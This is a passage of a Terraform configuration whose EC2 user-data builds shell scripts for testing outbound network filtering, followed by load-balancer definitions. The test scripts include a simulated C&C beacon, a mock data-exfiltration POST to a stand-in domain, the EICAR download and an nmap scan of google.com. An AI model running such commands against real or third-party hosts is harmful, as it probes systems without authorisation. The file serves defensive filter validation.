    aws s3 cp /tmp/test.txt s3://$BUCKET_NAME/ && echo "File uploaded successfully"
    echo "Testing file download..."
    aws s3 cp s3://$BUCKET_NAME/test.txt /tmp/test_download.txt && echo "File downloaded successfully"
    echo "Cleaning up test bucket..."
    aws s3 rm s3://$BUCKET_NAME/test.txt
    aws s3 rb s3://$BUCKET_NAME
    rm -f /tmp/test.txt /tmp/test_download.txt
} || echo "S3 bucket operations failed/blocked"
echo ""

echo "=== AWS Services Test Complete ==="
SCRIPT

sudo chmod +x /home/ubuntu/test_*.sh
sudo chown ubuntu:ubuntu /home/ubuntu/test_*.sh

# Create comprehensive test script with sudo permissions
sudo cat <<'SCRIPT' > /home/ubuntu/comprehensive_test.sh
#!/bin/bash
echo "=== Starting Comprehensive Security Test ==="
echo "Date: $(date)"
echo "Instance: $(hostname)"
echo "Private IP: $(hostname -I | awk '{print $1}')"
echo ""

echo "1. Basic connectivity test..."
sudo ./test_internet.sh
echo ""

echo "2. AWS Services communication test..."
sudo ./test_aws_services.sh
echo ""

echo "3. Malicious URL test..."
sudo ./test_malicious.sh
echo ""

echo "4. Additional network tests..."
echo "Testing suspicious IPs..."
for ip in "185.220.101.1" "198.51.100.1" "203.0.113.1"; do
  echo "Testing $ip..."
  sudo curl -s --connect-timeout 5 http://$ip || echo "Connection to $ip failed/blocked"
done

echo ""
echo "5. Port scanning simulation..."
sudo nmap -sT -p 22,80,443,8080 google.com 2>/dev/null || echo "Port scanning blocked/failed"

echo ""
echo "=== Test Complete ==="
SCRIPT

# Set proper permissions for all scripts with sudo
sudo chmod +x /home/ubuntu/*.sh
sudo chown ubuntu:ubuntu /home/ubuntu/*.sh

# Create convenience script for SSM Session Manager users
sudo cat <<'SCRIPT' > /home/ubuntu/setup_ssm_scripts.sh
#!/bin/bash
echo "Setting up scripts for SSM Session Manager..."
echo "Current directory: $(pwd)"
echo "Home directory: $HOME"

# Copy scripts to current directory if we're in an SSM session
if [[ "$PWD" =~ ^/var/snap/amazon-ssm-agent/.* ]]; then
    echo "Detected SSM Session Manager directory"
    echo "Copying test scripts to current location..."
    sudo cp /home/ubuntu/test_*.sh ./
    sudo cp /home/ubuntu/comprehensive_test.sh ./
    sudo chmod +x *.sh
    echo "Scripts copied successfully!"
    echo ""
    echo "Available scripts in current directory:"
    ls -la *.sh
else
    echo "Not in SSM session directory, scripts available at /home/ubuntu/"
    echo "Available scripts:"
    ls -la /home/ubuntu/*.sh
fi

echo ""
echo "Usage:"
echo "  ./test_internet.sh      - Test basic connectivity"
echo "  ./test_malicious.sh     - Test malicious URLs"
echo "  ./test_aws_services.sh  - Test AWS services"
echo "  ./comprehensive_test.sh - Run all tests"
SCRIPT

sudo chmod +x /home/ubuntu/setup_ssm_scripts.sh
sudo chown ubuntu:ubuntu /home/ubuntu/setup_ssm_scripts.sh

# Install AWS CLI using apt (proven to work)
echo "Installing AWS CLI..."
sudo apt-get update
sudo apt-get install -y awscli curl unzip jq ncat socat tcpdump

# Verify AWS CLI installation
sudo aws --version || echo "AWS CLI installation may have failed"

# Create helpful message for users
sudo cat <<'MESSAGE' > /home/ubuntu/README_TESTING.txt
=== Security Testing Scripts ===

Scripts Location: /home/ubuntu/

If connecting via SSM Session Manager:
1. Run: /home/ubuntu/setup_ssm_scripts.sh
   This will copy scripts to your current SSM session directory

Available Test Scripts:
- test_internet.sh      : Basic connectivity testing
- test_malicious.sh     : Malicious URL/IP testing  
- test_aws_services.sh  : AWS services communication testing
- comprehensive_test.sh : All tests combined

Usage Examples:
  sudo ./test_internet.sh
  sudo ./comprehensive_test.sh
  
For SSM users:
  /home/ubuntu/setup_ssm_scripts.sh
  sudo ./comprehensive_test.sh

Scripts are designed to work with MCD internet filtering validation.
MESSAGE

sudo chown ubuntu:ubuntu /home/ubuntu/README_TESTING.txt

# Create script recreation utility in case scripts have issues
sudo cat <<'RECREATE' > /home/ubuntu/recreate_scripts.sh
#!/bin/bash
echo "Recreating all test scripts..."

# Ensure directory and permissions
sudo mkdir -p /home/ubuntu
sudo chown ubuntu:ubuntu /home/ubuntu

# Recreate test_internet.sh
cat <<'SCRIPT' > /home/ubuntu/test_internet.sh
#!/bin/bash
echo "=== Internet Connectivity Test ==="
echo "Testing basic connectivity..."
curl -s http://httpbin.org/ip || echo "Failed to get IP"
echo ""
echo "Testing DNS resolution..."
nslookup google.com || echo "DNS resolution failed"
echo ""
echo "Testing HTTPS..."
curl -s https://httpbin.org/get | head -20 || echo "HTTPS test failed"
SCRIPT

# Recreate test_malicious.sh  
cat <<'SCRIPT' > /home/ubuntu/test_malicious.sh
#!/bin/bash
echo "=== Malicious URL/IP Testing ==="
echo "WARNING: These are test URLs/IPs for security testing"
echo ""
echo "Testing potentially malicious domains..."
curl -s --connect-timeout 5 http://malware.testing.google.test/testing/malware/ || echo "Blocked or failed"
curl -s --connect-timeout 5 http://testsafebrowsing.appspot.com/s/malware.html || echo "Blocked or failed"
echo "Testing suspicious file downloads..."
curl -s --connect-timeout 5 -o /tmp/eicar.txt http://www.eicar.org/download/eicar.com.txt || echo "Download blocked or failed"
echo "Testing C&C simulation..."
curl -s --connect-timeout 5 http://example.com:8080/beacon || echo "Connection blocked or failed"
echo "Testing data exfiltration patterns..."
curl -s --connect-timeout 5 -X POST -d "sensitive_data=test123" http://suspicious-domain.example || echo "POST blocked or failed"
SCRIPT

# Recreate comprehensive test
cat <<'SCRIPT' > /home/ubuntu/comprehensive_test.sh
#!/bin/bash
echo "=== Starting Comprehensive Security Test ==="
echo "Date: $(date)"
echo "Instance: $(hostname)"
echo "Private IP: $(hostname -I | awk '{print $1}')"
echo ""

echo "1. Basic connectivity test..."
/home/ubuntu/test_internet.sh
echo ""

echo "2. Malicious URL test..."
/home/ubuntu/test_malicious.sh
echo ""

echo "3. Additional network tests..."
echo "Testing suspicious IPs..."
for ip in "185.220.101.1" "198.51.100.1" "203.0.113.1"; do
  echo "Testing $ip..."
  curl -s --connect-timeout 5 http://$ip || echo "Connection to $ip failed/blocked"
done

echo ""
echo "4. Port scanning simulation..."
nmap -sT -p 22,80,443,8080 google.com 2>/dev/null || echo "Port scanning blocked/failed"

echo ""
echo "=== Test Complete ==="
SCRIPT

# Set proper permissions
chmod +x /home/ubuntu/test_*.sh
chmod +x /home/ubuntu/comprehensive_test.sh
chown ubuntu:ubuntu /home/ubuntu/*.sh

echo "Scripts recreated successfully!"
echo "Available scripts:"
ls -la /home/ubuntu/*.sh
RECREATE

sudo chmod +x /home/ubuntu/recreate_scripts.sh
sudo chown ubuntu:ubuntu /home/ubuntu/recreate_scripts.sh

# Ensure final permissions are correct
sudo chmod +x /home/ubuntu/*.sh
sudo chown ubuntu:ubuntu /home/ubuntu/*

# Log the completion
echo "Script setup completed at $(date)" | sudo tee -a /var/log/user-data-setup.log

EOT
  subnet_id                   = aws_subnet.sample_private_subnet2.id
  vpc_security_group_ids      = [aws_security_group.sample_security_group.id]
  tags = {
    Name = "${var.prefix}-z2-private-test"
    Category = "security-testing"
    Environment = "private"
  }
}

# 6. Application Load Balancers (Public & Private)
# ----------------------------------------------------------
resource "aws_lb" "sample_alb_public" {
  name               = "${var.prefix}-alb-public"
  load_balancer_type = "application"
  subnets            = [aws_subnet.sample_subnet1.id, aws_subnet.sample_subnet2.id]
  security_groups    = [aws_security_group.sample_security_group.id]
  internal           = false
  enable_deletion_protection = false
  tags = { Name = "${var.prefix}-alb-public" }
}
resource "aws_lb_target_group" "sample_alb_tg_public" {
  name     = "${var.prefix}-alb-tg-public"
  port     = 80
  protocol = "HTTP"
  vpc_id   = aws_vpc.sample_vpc.id
  health_check {
    path                = "/"
    protocol            = "HTTP"
    matcher             = "200-399"
    interval            = 30
    timeout             = 5
    healthy_threshold   = 2
    unhealthy_threshold = 2
  }
  tags = { Name = "${var.prefix}-alb-tg-public" }
}
resource "aws_lb_listener" "sample_alb_listener_public" {
  load_balancer_arn = aws_lb.sample_alb_public.arn
  port              = 80
  protocol          = "HTTP"
  default_action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.sample_alb_tg_public.arn
  }
}
resource "aws_lb_target_group_attachment" "app1_attachment_public" {
  target_group_arn = aws_lb_target_group.sample_alb_tg_public.arn
  target_id        = aws_instance.app_instance1.id
  port             = 80
}
resource "aws_lb_target_group_attachment" "app2_attachment_public" {
  target_group_arn = aws_lb_target_group.sample_alb_tg_public.arn
  target_id        = aws_instance.app_instance2.id
  port             = 80
}
resource "aws_lb" "sample_alb_private" {
  name               = "${var.prefix}-alb-private"
  load_balancer_type = "application"
  subnets            = [aws_subnet.sample_private_subnet1.id, aws_subnet.sample_private_subnet2.id]
  security_groups    = [aws_security_group.sample_security_group.id]
  internal           = true
  enable_deletion_protection = false
  tags = { Name = "${var.prefix}-alb-private" }
}
resource "aws_lb_target_group" "sample_alb_tg_private" {
  name     = "${var.prefix}-alb-tg-private"
  port     = 80
  protocol = "HTTP"
  vpc_id   = aws_vpc.sample_vpc.id
  health_check {
    path                = "/"
    protocol            = "HTTP"
    matcher             = "200-399"
    interval            = 30
    timeout             = 5
    healthy_threshold   = 2
    unhealthy_threshold = 2
  }
  tags = { Name = "${var.prefix}-alb-tg-private" }
}
resource "aws_lb_listener" "sample_alb_listener_private" {
  load_balancer_arn = aws_lb.sample_alb_private.arn
  port              = 80
  protocol          = "HTTP"
  default_action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.sample_alb_tg_private.arn
  }
}
resource "aws_lb_target_group_attachment" "app1_attachment_private" {
  target_group_arn = aws_lb_target_group.sample_alb_tg_private.arn
  target_id        = aws_instance.app_instance1.id
  port             = 80
}
resource "aws_lb_target_group_attachment" "app2_attachment_private" {
  target_group_arn = aws_lb_target_group.sample_alb_tg_private.arn
  target_id        = aws_instance.app_instance2.id
  port             = 80
}
# ----------------------------------------------------------
# End of US VPC resources
# ----------------------------------------------------------

